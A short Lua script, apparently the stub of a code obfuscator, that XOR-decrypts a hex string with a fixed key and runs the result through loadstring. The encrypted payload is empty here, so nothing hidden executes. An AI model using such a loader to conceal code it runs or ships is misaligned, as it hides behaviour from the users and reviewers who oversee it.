local k={100,43,162,26,84,88,232,237,126,95,175,31,212,21,209,150,243,106,249,219,12,205,158,195,26,77,101,3,134,242,105,198}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
